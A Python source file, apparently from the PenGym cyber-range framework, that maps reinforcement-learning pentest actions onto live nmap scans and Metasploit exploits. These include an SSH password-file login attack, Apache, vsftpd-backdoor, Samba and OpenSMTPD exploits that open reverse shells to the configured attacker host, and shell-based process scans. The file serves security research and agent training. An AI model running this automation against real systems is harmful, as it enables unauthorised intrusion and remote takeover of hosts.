
# Import libraries
import time
import logging
import numpy as np

from nasim.envs.host_vector import HostVector
from nasim.envs.action import ActionResult
from nasim.envs.utils import AccessLevel
from pengym.storyboard import Storyboard
from pymetasploit3.msfrpc import MeterpreterSession, ShellSession

import pengym.utilities as utils

storyboard = Storyboard()

class PenGymHostVector(HostVector):
    """A Vector representation of a single host in PenGym derived from the NASim HostVector class

    Args:
        HostVector: HostVector Class from NASim
    """

    # Perform action (overrides super class function)
    def perform_action(self, action):
        """Perform given action on this host. This function overrides the perform_action() function in NASim HostVector.

        Args:
            action (Action): The action to perform

        Returns:
            PenGymHostVector: The resulting state of host after action
            ActionObservation: The result of the action
        """

        # Get the subnet firewall configuration in scenario
        firewall = utils.scenario.firewall

        # Get address space in scenario
        address_space = utils.scenario.address_space

        # Get list of services in scenario
        scenario_services = utils.scenario.services

        # Get list of os in scenario
        scenario_os = utils.scenario.os

        # Get list of process in scenario
        scenario_processes = utils.scenario.processes

        # Reset the value of PenGym Error
        utils.PENGYM_ERROR = False

        # Get list of available port/ports in the current host in scenario
        host_services_dict = utils.scenario.hosts[self.address].services

        if utils.ENABLE_PENGYM:
            ports = utils.map_services_to_ports(host_services_dict)

            # Map host address to IP address
            host_ip_list = utils.map_host_address_to_IP_address(utils.host_map, self.address)

        # Set tags to differentiate between PenGym and NASim actions
        # only if both of them are enabled
        if utils.ENABLE_PENGYM and utils.ENABLE_NASIM:
            tag_pengym = storyboard.TAG_PENGYM
            tag_nasim = storyboard.TAG_NASIM
        else:
            tag_pengym = ""
            tag_nasim = ""

        ###########################################################################################
        ###########################################################################################
        # Execute actions by following the order in NASim host_vector.py
        # Copy the next state for future purposes
        next_state = self.copy()

        ###########################################################################################
        # Perform ServiceScan
        if action.is_service_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                service_dict = None
                service_result = None
                service_list = list()

                service_dict = utils.host_map[self.address][storyboard.SERVICES]
                service_scan_state = utils.host_map[self.address][storyboard.SERVICE_SCAN_STATE]

                if service_scan_state:
                    # Do service scan for each IP address of host
                    for host_ip in host_ip_list:
                        service_result, service_exec_time = self.do_service_scan(host_ip, utils.nmap_scanner, ports)
                        if service_result:
                            service_list.append(service_result)

                    # Transform to compatible NASim result format
                    service_list = [item for sublist in service_list for item in sublist]
                
                    if service_list:
                        service_dict = utils.map_result_list_to_dict(service_list, scenario_services)
                        utils.host_map[self.address][storyboard.SERVICES] = service_dict

                    utils.host_map[self.address][storyboard.SERVICE_SCAN_STATE] = False
                else:
                    end = time.time()
                    service_exec_time = end - start

                # Print the result of the PenGym action
                if service_dict:
                    result = ActionResult(True, services=service_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: services={service_dict} Execution Time: {service_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_service_scan(): {service_result}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, service_exec_time)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                filtered_services = self.filter_permission_services(action, firewall, address_space) # Get the permitted services
                start = time.time()
                result = ActionResult(True, services=filtered_services) # NASim code: ActionResult(True, 0, services=self.services)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: services={result.services} Execution Time: {end-start:1.6f}{tag_nasim}")

            return next_state, result


        ###########################################################################################
        # Perform OSScan
        if action.is_os_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                os_result_dict = None
                os_result = None

                os_result_dict = utils.host_map[self.address][storyboard.OS]
                os_scan_state = utils.host_map[self.address][storyboard.OS_SCAN_STATE]

                if (os_result_dict is None and os_scan_state):
                    # Do OS scan for each IP address of host
                    for host_ip in host_ip_list:
                        os_result, osscan_exec_time = self.do_os_scan(host_ip, utils.nmap_scanner, ports)
                        if (os_result):
                            # Transform to compatible Nasim result format
                            os_result_dict = utils.map_result_list_to_dict(os_result, scenario_os)
                            utils.host_map[self.address][storyboard.OS] = os_result_dict
                            break

                    utils.host_map[self.address][storyboard.OS_SCAN_STATE] = False

                else:
                    end = time.time()
                    osscan_exec_time = end - start

                # Print the result of action of Pengym
                if os_result_dict:
                    result = ActionResult(True, os=os_result_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: os={result.os} Execution Time: {osscan_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_os_scan(): {os_result}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, osscan_exec_time)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                if self.check_allowed_traffic(action, firewall, address_space, host_services_dict):
                    result = ActionResult(True, os=self.os) # NASim code: ActionResult(True, 0, os=self.os)
                    end = time.time()
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    end = time.time()
                    utils.print_failure(action, result, storyboard.NASIM, end-start)

            return next_state, result


        ###########################################################################################
        # Perform Exploit
        if action.is_exploit():

            # PenGym execution
            if utils.ENABLE_PENGYM:

                start = time.time()

                # Get status of bridge in current host
                bridge_up = utils.host_map[self.address][storyboard.BRIDGE_UP]

                # Get status of host compromised in current subnet
                has_host_compromised = utils.check_host_compromised_within_subnet(self.address[0])

               # Get status of available default gw in current host and update default gw
                default_gw = utils.host_map[self.address][storyboard.DEFAULT_GW]
                if (not default_gw):
                    utils.check_and_update_available_gw(self.address)

                # Get the state of exploit action
                service_exploit_state = utils.host_map[self.address][storyboard.SERVICE_EXPLOIT_STATE]

               # Execute the exploit if exploit status is None
               # Or the exploit action need to be re-executed on this host
                if action.service not in utils.host_map[self.address][storyboard.EXPLOIT_ACCESS] or (service_exploit_state and utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service] is None):
                    for host_ip in host_ip_list:

                        # Check if do e_samba with valid condition -> open firewall as temporary solution
                        if action.service == utils.storyboard.SAMBA:
                            # Check the permission of samba service in target host
                            filtered_services = self.filter_permission_services(action, firewall, address_space)
                            if filtered_services[utils.storyboard.SAMBA] == 1.0:
                                utils.open_firewall_rule_e_samba(self.address)

                        exploit_result, access, exploit_exec_time = self.do_exploit(host_ip, host_ip_list, action.service)

                        if exploit_result:
                            # Save the shell
                            if (utils.host_map[self.address][storyboard.SHELL] is None):
                                utils.host_map[self.address][storyboard.SHELL] = exploit_result
                            utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service] = access
                            break
                        else:
                            utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service] = None

                    utils.host_map[self.address][storyboard.SERVICE_EXPLOIT_STATE] = False
                else:
                    access = utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service]
                    if access:
                        exploit_result = True
                    else:
                        exploit_result = False

                    end = time.time()
                    exploit_exec_time = end - start

                # Update state and print the result
                if exploit_result:

                    # Update current access level in host_map if needed
                    host_access = utils.host_map[self.address][storyboard.ACCESS]
                    if (host_access < AccessLevel[access].value):
                        utils.host_map[self.address][storyboard.ACCESS] = float(AccessLevel[access].value)

                    # Check the bridge status and active bridge
                    activate_link_list = list()
                    if not bridge_up:
                        activate_link_list = utils.activate_host_bridge(self.address)
                        utils.host_map[self.address][storyboard.BRIDGE_UP] = True

                    # Update the service scan state of related hosts due the new host be compromised
                    utils.update_host_service_scan_state(self.address[0], has_host_compromised, activate_link_list)
 
                    # Update the firewall off all hosts within a subnet (update once when there is a host be compromised)
                    if not has_host_compromised:
                        utils.add_firewall_rules_all_hosts(self.address[0])

                    # Set parameters according to NASim code logic
                    value = 0.0
                    next_state.compromised = True
                    if not self.access == AccessLevel.ROOT:
                        # Ensure that a machine is not rewarded twice and access level does not decrease
                        next_state.access = action.access
                        if action.access == AccessLevel.ROOT:
                            value = self.value

                    # Get the services and OS of the current host
                    host_services = utils.host_map[self.address][storyboard.SERVICES]
                    host_os = utils.host_map[self.address][storyboard.OS]

                    #NOTE: In training, for compatibility to NASim, change host_services to self.services and host_os to self.os in ActionResult(...)
                    result = ActionResult(True, value=value, services=host_services, os=host_os, access=access)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={result.access} services={result.services if result.services else None } os={result.os if result.os else None} Execution Time: {exploit_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_exploit(): exploit_result={exploit_result} access={access}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, exploit_exec_time)

            # NASim execution (NOTE: next_state IS modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                next_state, result = super().perform_action(action)
                end = time.time()
                if result.success:
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={AccessLevel(result.access)} services={result.services} os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    utils.print_failure(action, result, storyboard.NASIM, end-start)

            return next_state, result

        # Use NASim code logic to ensure that the following actions are only executed on host
        # if the correct access level has already been obtained
        if not (self.compromised and action.req_access <= self.access):
            result = ActionResult(False, 0, permission_error=True)
            return next_state, result


        ###########################################################################################
        # Perform ProcessScan
        if action.is_process_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                process_dict = dict()

                process_dict = utils.host_map[self.address][storyboard.PROCESSES]

                if (process_dict is None):
                    process_result, processcan_exec_time = self.do_process_scan()
                    process_list = list()

                    if (process_result):
                        # Get list of running process of target host after scanning that compatibles with processes from scenario
                        for process in process_result:
                            for scenario_process_name in scenario_processes:
                                if scenario_process_name in process:
                                    process_list.append(scenario_process_name)

                        # Transform to compatible Nasim result format
                        process_dict = utils.map_result_list_to_dict(process_list, scenario_processes)

                        utils.host_map[self.address][storyboard.PROCESSES] = process_dict

                else:
                    end = time.time()
                    processcan_exec_time = end - start

                # Print the result
                if process_dict:

                    # Get the access level of the current host
                    host_access = utils.host_map[self.address][storyboard.ACCESS]

                    result = ActionResult(True, access=host_access, processes=process_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: processes={result.processes} access={AccessLevel(result.access)} Execution Time: {processcan_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_process_scan(): {process_list}, Host map: {utils.host_map}")
                    result = ActionResult(False, undefined_error=True)
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, processcan_exec_time)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                result = ActionResult(True, access=self.access, processes=self.processes) # NASim code: ActionResult(True, 0, access=self.access, processes=self.processes)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: processes={result.processes} access={AccessLevel(result.access)} Execution Time: {end-start:1.6f}{tag_nasim}")

            return next_state, result


        ###########################################################################################
        # Perform PrivilegeEscalation
        if action.is_privilege_escalation():

            # PenGym execution
            if utils.ENABLE_PENGYM:

                start = time.time()

                bridge_up = utils.host_map[self.address][storyboard.BRIDGE_UP]

                if (action.process not in utils.host_map[self.address][storyboard.PE_SHELL]):
                    pe_result, access, pe_exec_time = self.do_privilege_escalation(host_ip_list, action.process)
                    if pe_result:
                        utils.host_map[self.address][storyboard.PE_SHELL][action.process] = pe_result
                    else:
                        utils.host_map[self.address][storyboard.PE_SHELL][action.process] = None
                else:
                    pe_result = utils.host_map[self.address][storyboard.PE_SHELL][action.process]
                    if pe_result:
                        access = storyboard.ROOT
                    else:
                        access = None

                    end = time.time()
                    pe_exec_time = end - start

                # Update state and print the result
                if pe_result:

                    # Update current access level in host_map
                    host_access = utils.host_map[self.address][storyboard.ACCESS]

                    if (host_access < AccessLevel[access].value):
                        utils.host_map[self.address][storyboard.ACCESS] = float(AccessLevel[access].value)

                    # Check the bridge status and active bridge
                    if not bridge_up:
                        utils.activate_host_bridge(self.address)
                        utils.host_map[self.address][storyboard.BRIDGE_UP] = True

                    # Set parameters according to NASim code logic
                    value = 0.0
                    if not self.access == AccessLevel.ROOT:
                        # Ensure that a machine is not rewarded twice and access level does not decrease
                        next_state.access = action.access
                        if action.access == AccessLevel.ROOT:
                            value = self.value

                    # Get the processes and OS of the current host
                    host_processes = utils.host_map[self.address][storyboard.PROCESSES]
                    host_os = utils.host_map[self.address][storyboard.OS]

                    #NOTE: In training, for compatibility to NASim, change host_services to self.services and host_os to self.os in ActionResult(...)
                    result = ActionResult(True, value=value, processes=host_processes, os=host_os, access=access)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={result.access} processes={result.processes if result.processes else None } os={result.os if result.os else None} Execution Time: {pe_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_privilege_escalation(): action_success={pe_result} access_result={access}")
                    result = ActionResult(False, undefined_error=True)
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, pe_exec_time)

            # NASim execution (NOTE: next_state IS modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                next_state, result = super().perform_action(action)
                end = time.time()
                if result.success:
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={AccessLevel(result.access)} processes={result.processes} os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    utils.print_failure(action, result, storyboard.NASIM, end-start)

            return next_state, result


        ###########################################################################################
        # Try to perform any unsupported actions (only happens if new actions are introduced in NASim)
        next_state, result = super().perform_action(action)
        logging.warning(f"Unsupported action '{action.name}': result={result}")
        return next_state, result


    ###################################################################################
    def copy(self):
        """Copy the state itself and cast to PenGymHostVector

        Returns:
            PenGymHostVector: State of this host
        """
        copyVector = super().copy()
        penGymVector = PenGymHostVector(copyVector.vector)
        return penGymVector

    ###################################################################################
    def check_allowed_traffic(self, action, firewall, addr_space, host_services_dict):
        """Check if there is any allowed service available
        between the source host and the target host

        Args:
            action (Action): The action to perform
            firewall (dict): The subnet firewall configuration in this scenario
            addr_space (list): The list of address space (all host address) in this scenario
            host_services_dict (dict): The list of available port/ports in the current host in the scenario

        Returns:
            (bool): True if there is an allowed service available between the source host and the target host
        """

        traffic_allow = False
        allowed_services = list()

        # Check is the target host belong to a public subnet
        # Check the permission of communication between public subnet and the Internet
        if (utils.scenario.topology[action.target[0]][0] == 1) and (len(firewall[(0,action.target[0])]) != 0):
            allowed_services = firewall[(0,action.target[0])]

            for host_service_item in host_services_dict.keys():
                if (host_services_dict[host_service_item]) and host_service_item in allowed_services:
                    traffic_allow = True
                    break

        # Check the permission of communication between source host (compromised and connected host) to the target host
        for src_addr in addr_space:
            if utils.current_state.host_compromised(src_addr):
                # Case: Source host and target host are in the same subnet
                if (src_addr[0] == action.target[0]):
                    traffic_allow = True
                    break
                else:
                    # Case: Source host and target host are not in the same subnet
                    link = (src_addr[0], action.target[0])
                    if link in firewall and len(firewall[link]) != 0:
                        allowed_services = firewall[link]
                        
                        for host_service_item in host_services_dict.keys():
                            if (host_services_dict[host_service_item]) and host_service_item in allowed_services:
                                traffic_allow = True
                                break

        return traffic_allow
    
    ###################################################################################
    def filter_permission_services(self, action, firewall, addr_space):
        """Filter the permitted servies between source hosts and target

            Args:
                action (Action): The action to perform
                firewall (dict): The subnet firewall configuration in this scenario
                addr_space (list): The list of address space (all host address) in this scenario

            Returns:
                filtered_services (dict): Permitted servies between source hosts and target host
        """

        allowed_services = list()
        filtered_services = dict()
        
        # Check is the target host belong to a public subnet
        # Check the allowed services between public subnet and the Internet
        if utils.scenario.topology[action.target[0]][0] == 1:
            link_allow_service = firewall[(0,action.target[0])]
            allowed_services = allowed_services + link_allow_service

        # Get the permitted services between source host (compromised and connected host) to the target host
        for src_addr in addr_space:
            link_allow_service = list()
            
            if utils.current_state.host_compromised(src_addr):
                # Case: Source host and target host are in the same subnet
                if (src_addr[0] == action.target[0]):
                    allowed_services = list(self.services.keys())
                    break
                else:
                    # Case: Source host and target host are not in the same subnet
                    link = (src_addr[0], action.target[0])
                    
                    if link in firewall:
                        link_allow_service = firewall[link]
                        allowed_services = allowed_services + link_allow_service

        # Map result to dictionary
        for service, value in self.services.items():
            if service in allowed_services:
                filtered_services[service] = value
            else:
                filtered_services[service] = np.float32(False)

        return filtered_services

    ###################################################################################
    def parse_exploit_result(self, result):
        """Parse the results of the exploit and return the job id on success

        Args:
            result (dict) : result from executing module in metasploit

        Returns:
            job_id (str): index of job
        """

        JOB_ID_KEY = "job_id"
        ERROR_KEY = "error"
        ERROR_MESSAGE_KEY = "error_message"

        # Check for correct execution
        if JOB_ID_KEY in result:
            job_id = result[JOB_ID_KEY]
            if job_id is not None:
                return str(job_id) # Must return a string, not an int
            else:
                logging.warning(f"Execution failed: job id is '{job_id}'")
                return None

        # Check for errors
        elif ERROR_KEY in result and result[ERROR_KEY]:
            if ERROR_MESSAGE_KEY in result:
                logging.warning(f"Execution returned an error: {result[ERROR_MESSAGE_KEY]}")
            else:
                logging.warning(f"Execution returned an error")

        return None

    ###################################################################################
    def get_current_shell_id(self, msfrpc, host_ip_list, exploit_name = None, arch=None):
        """Get shell id of the host in session list that corresponding to current acction

        Args:
            msfrpc (MsfRpcClient) : msfrpc client
            host_ip_list (list): List of host IP addresses
            exploit_name (str): Name of service that is used to exploit
            arch (str): Architecture of shell

        Returns:
            session_key (str): shell id of current host
        """
        
        TYPE_KEY = "type"
        ARCH = "arch"
        SHELL_VALUE = "shell"
        TARGET_HOST_KEY = "target_host"
        EXPLOIT_NAME = "via_exploit"
        TUNNEL_PEER = "tunnel_peer"
        
        for session_key, session_details in msfrpc.sessions.list.items():
            if TYPE_KEY in session_details and TARGET_HOST_KEY in session_details and EXPLOIT_NAME in session_details and TUNNEL_PEER in session_details:
                tunnel_ip = session_details[TUNNEL_PEER].split(':')[0]

                if session_details[TYPE_KEY] == SHELL_VALUE:
                    if arch and arch not in session_details[ARCH]:
                            continue
                    
                    if exploit_name:
                        if exploit_name in session_details[EXPLOIT_NAME]:
                            if (session_details[TARGET_HOST_KEY] in host_ip_list) and (tunnel_ip in host_ip_list):
                                return session_key
                    else:
                        if (session_details[TARGET_HOST_KEY] in host_ip_list) and (tunnel_ip in host_ip_list):
                            return session_key

        return None

    ###################################################################################
    def get_existed_meterpreter_id(self, msfrpc, host, exploit_name = None):
        """Get existing meterpreter id of the host in session list

        Args:
            msfrpc (MsfRpcClient) : msfrpc client
            host (str): host ip address
            exploit_name (str): Name of process that is used to exploit

        Returns:
            session_key (str): meterpreter id of current host
        """
        TYPE_KEY = "type"
        ROOT_LEVEL = "root"
        METERPRETER_VALUE = "meterpreter"
        SESSION_HOST_KEY = "session_host"
        INFO_KEY = "info"
        EXPLOIT_NAME = "via_exploit"
        
        for session_key, session_details in msfrpc.sessions.list.items():
            if TYPE_KEY in session_details and SESSION_HOST_KEY in session_details and EXPLOIT_NAME in session_details:
                if session_details[TYPE_KEY] == METERPRETER_VALUE:
                    if exploit_name:

                        if exploit_name in session_details[EXPLOIT_NAME]:
                            if (host == session_details[SESSION_HOST_KEY] or host in session_details[INFO_KEY]) and ROOT_LEVEL in session_details[INFO_KEY]:
                                return session_key

                    else:
                        if (host == session_details[SESSION_HOST_KEY] or host in session_details[INFO_KEY]) and ROOT_LEVEL in session_details[INFO_KEY]:
                            return session_key

        return None

    ###################################################################################
    def get_access_level(self, shell):
        """Get access level of the current host

        Args
        ---------
        shell (ShellSession/MeterpreterSession) : shell session

        Returns
        -------
        access (str): access level of current host
        """

        WHOAMI_CMD = 'whoami'
        GET_UID_CMD = 'getuid'

        if (isinstance(shell, ShellSession)):
            shell.write(WHOAMI_CMD)
        elif (isinstance(shell, MeterpreterSession)):
            shell.write(GET_UID_CMD)

        time.sleep(1)
        response = shell.read()

        while (len(response) == 0):
            time.sleep(0.1)
            response = shell.read()

        if storyboard.ROOT.lower() in response:
            access = storyboard.ROOT
        else:
            access = storyboard.USER

        return access

    ###################################################################################
    def do_service_scan(self, host, nm, ports=False):
        """Perform the service scan

        Args
        ---------
        host (str) : host ip address that is used for service scan
        nm (NMap Scanner)
        ports (list): list required ports for scanning

        Returns
        -------
        services_name (list): list of service's name of current host
        """

        # Check port the existed of port
        # -Pn: Tells Nmap not to use ping to determine if the target is up
        # Nmap will do the requested scanning functions against every target IP specified, as if every one is active.
        # -n: Tells Nmap not to perform DNS resolution
        # -sS: Tells Nmap to use TCP SYN scanning
        # -T5: Nmap should use the most aggressive timing template
        # -sV: Nmap determine the details information about the services

        SCAN = 'scan'
        UDP = 'udp'
        TCP = 'tcp'
        NAME = 'name'
        PRODUCT = 'product'
        STATE = 'state'
        OPEN = 'open'
        ARGS = '-Pn -n -sS -sV -T5'

        services_scan = list()
        services_name = list()

        start = time.time()

        if ports:
            ports = ', '.join(str(port) for port in ports)
            service_scan = nm.scan(host, ports, arguments=ARGS, sudo=True)
            services_scan.append(service_scan)
        else:
            service_scan = nm.scan(host, arguments=ARGS, sudo=True)
            services_scan.append(service_scan)
        
        end = time.time()

        for service_scan in services_scan:
            # Get the list of service from the service scan result

            for ip in service_scan[SCAN].keys():
                ip_dict = service_scan[SCAN][ip]

                if UDP in ip_dict:
                    for port_name in ip_dict[UDP]:
                        if ip_dict[TCP][port_name][STATE] == OPEN:
                            service = ip_dict[UDP][port_name][NAME]
                            services_name.append(service)
                            product = ip_dict[UDP][port_name][PRODUCT].lower()
                            services_name.append(product)

                if TCP in ip_dict:
                    for port_name in ip_dict[TCP]:
                        if ip_dict[TCP][port_name][STATE] == OPEN:
                            service = ip_dict[TCP][port_name][NAME]
                            services_name.append(service)
                            product = ip_dict[TCP][port_name][PRODUCT].lower()
                            services_name.append(product)

        return services_name, end-start

    ###################################################################################
    def do_os_scan(self, host, nm, ports=False):
        """Perform the service scan

        Args
        ---------
        host (str) : host ip address that is used for service scan
        nm (Nmap Scanner)
        ports (list): list required ports for scanning

        Returns
        -------
        os_name (list): list of os name of current host
        """

        # Check port the existed of port
        # -Pn: tells Nmap not to use ping to determine if the target is up
        # Nmap will do the requested scanning functions against every target IP specified, as if every one is active.
        # -n: tells Nmap not to perform DNS resolution. 
        # -O: tells Nmap to perform operating system detection
        # -T5: Nmap should use the most aggressive timing template

        SCAN = 'scan'
        OSMATCH = 'osmatch'
        NAME = 'name'
        ARGS = '-Pn -n -O -T5'

        os_scan_list = list()
        os_name = list()

        start = time.time()

        if ports:
            ports = ', '.join(str(port) for port in ports)
            osscan = nm.scan(host, ports, arguments=ARGS, sudo=True)
            os_scan_list.append(osscan)
        else:
            osscan = nm.scan(host, arguments=ARGS, sudo=True)
            os_scan_list.append(osscan)
        
        end = time.time()

        for osscan in os_scan_list:
            # Get the os list from os scan result
            for key in osscan[SCAN].keys():
                osmatch = osscan[SCAN][key][OSMATCH]
                if osmatch: 
                    os = osmatch[0][NAME]
                    os_type = os.split(' ',1)[0].lower()
                    os_name.append(os_type)

        return os_name, end-start

    ###################################################################################
    def do_exploit(self, host, host_ip_list, service):
        """Do exploit on target host

        Args
        ---------
        host (str) : host ip address that is used for exploit
        host_ip_list (list): List of host IP addresses

        Returns
        -------
        shell (ShellSession): shell session of current host
        access (str): access level after exploiting
        """

        arch = None
        start = time.time()

        msfrpc = utils.msfrpc_client
        if not msfrpc:
            end = time.time()
            print("None in not msfrpc")
            return None, None, end-start

        if service == storyboard.SSH:
            result = self.do_e_ssh(msfrpc, host)
        elif service == storyboard.FTP:
            arch = utils.storyboard.CMD
            result = self.do_e_ftp(msfrpc, host)
        elif service == storyboard.HTTP:
            arch = utils.storyboard.X64
            result = self.do_e_http(msfrpc, host)
        elif service == storyboard.SAMBA:
            arch = utils.storyboard.CMD
            result = self.do_e_samba(msfrpc, host)
        elif service == storyboard.SMTP:
            arch = utils.storyboard.CMD
            result = self.do_e_smtp(msfrpc, host)
        else:
            logging.debug(f"Exploit action is not existed")

        # Get the job id on success
        job_id = self.parse_exploit_result(result)

        if not job_id:
            end = time.time()
            print("None in not job_id")
            return None, None, end-start

        elif service == utils.storyboard.SSH:
            # Must wait until job completes to ensure the session is created
            while job_id in msfrpc.jobs.list:
                time.sleep(0.1)
            shell_id = self.get_current_shell_id(msfrpc, host_ip_list, service)

        else:
            flag = True # Stop when shell is created or job is finished
            while flag:

                if (job_id not in msfrpc.jobs.list):
                    print("* WARNING: Job does not exist")
                    print(msfrpc.sessions.list)
                    flag = False

                # Get shell id from msfrpc sesions list
                shell_id = self.get_current_shell_id(msfrpc, host_ip_list, service, arch)
                if shell_id:
                    flag = False
                    break

                end = time.time()

        end = time.time()

        # Stop the job id
        msfrpc.jobs.stop(job_id)

        # Get the access level
        if shell_id:
            shell = msfrpc.sessions.session(shell_id)
            access = self.get_access_level(shell)
            return shell, access, end-start
        else:
            logging.debug(f"Shell for host {host} could not be created")
            return None, None, end-start

    def do_e_ssh(self, msfrpc, host):
        """Do ssh-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Get information for e_ssh action
        ssh_account = utils.config_info[storyboard.CYBER_RANGE][storyboard.GUEST_SETTINGS][storyboard.TASKS][storyboard.ADD_ACCOUNT][storyboard.SSH]

        username = ssh_account[storyboard.ACCOUNT]
        pass_file = utils.replace_file_path(database=utils.config_info,
                                            file_name=ssh_account[storyboard.PWD_FILE])

        # Execute exploit module to create the shell
        exploit_ssh = msfrpc.modules.use('auxiliary','scanner/ssh/ssh_login') # This value is fixed for e_ssh action

        exploit_ssh[storyboard.RHOSTS] = host
        exploit_ssh[storyboard.USERNAME] = username
        exploit_ssh[storyboard.PASS_FILE] = pass_file
        exploit_ssh[storyboard.SSH_TIMEOUT] = 3

        result = exploit_ssh.execute()

        return result

    def do_e_http(self, msfrpc, host):
        """Do http-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_apache = msfrpc.modules.use('exploit', 'multi/http/apache_normalize_path_rce')
        exploit_apache[storyboard.RHOSTS] = host
        exploit_apache[storyboard.RPORT] = 80
        exploit_apache[storyboard.SSL_MODULE_ARG] = False

        payload = msfrpc.modules.use('payload', 'linux/x64/shell/reverse_tcp')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]

        result = exploit_apache.execute(payload=payload)

        return result

    def do_e_ftp(self, msfrpc, host):
        """Do ftp-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_ftp = msfrpc.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit_ftp[storyboard.RHOSTS] = host
        exploit_ftp[storyboard.WFSDElAY] = 120

        payload = msfrpc.modules.use('payload', 'cmd/unix/interact')
        result = exploit_ftp.execute(payload=payload)

        return result

    def do_e_samba(self, msfrpc, host):
        """Do samba-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_samba = msfrpc.modules.use('exploit', 'linux/samba/is_known_pipename')
        exploit_samba[storyboard.RHOSTS] = host
        exploit_samba[storyboard.SMB_FOLDER] = '/home/shared' # This path is the same with share path in samba configuration scrript
        exploit_samba[storyboard.FAKE_BIND] = False

        payload = msfrpc.modules.use('payload', 'cmd/unix/interact')

        result = exploit_samba.execute(payload=payload)

        return result

    def do_e_smtp(self, msfrpc, host):
        """Do smtp-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_smtp = msfrpc.modules.use('exploit', 'unix/smtp/opensmtpd_mail_from_rce')
        exploit_smtp[storyboard.RHOSTS] = host
        exploit_smtp[storyboard.AUTO_CHECK] = False
        exploit_smtp[storyboard.FORCE_EXPLOIT] = True
        exploit_smtp[storyboard.EXPECT_TIMEOUT] = 5
        exploit_smtp[storyboard.CONNECT_TIMEOUT] = 50

        payload = msfrpc.modules.use('payload', 'cmd/unix/reverse_netcat')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
        payload[storyboard.LPORT] = 4444 # Default value in Metasploit

        result = exploit_smtp.execute(payload=payload)

        return result

    ###################################################################################
    def do_process_scan(self):
        """Do process scan on current host

        Returns
        -------
        process_list (list): list of current processes
        """

        PROCESS_SCAN_SHELL = 'ps -ef'
        flag_process = '/sbin/init' # Use to wait for getting all processes
        process_list = list()

        start = time.time()

        # Get the existed shell session from the target host
        session = utils.host_map[self.address][storyboard.SHELL]
        session.write(PROCESS_SCAN_SHELL)
        time.sleep(1)
        response = session.read()

        while (flag_process not in response):
            time.sleep(1)
            response = session.read() + response

            # Stop condition
            if (time.time() - start > 30):
                print("Over time: ", response)
                break

        process_list = response.split('\n')

        end = time.time()
        return process_list, end-start

    ###################################################################################
    def do_privilege_escalation(self, host_ip_list, process):
        """Do privilege escalation on target host

        Args
        ---------
        host_ip_list (list) : list of ip addresses in current host

        Returns
        -------
        shell/meterpreter (ShellSession/MeterpreterSession): shell or meterpreter session of current host
        access (str): access level after exploiting
        """

        start = time.time()

        msfrpc = utils.msfrpc_client
        if not msfrpc:
            end = time.time()
            print("* WARNING: MSF RPC client is not defined")
            return None, None, end-start

        shell_id = self.get_current_shell_id(msfrpc, host_ip_list)

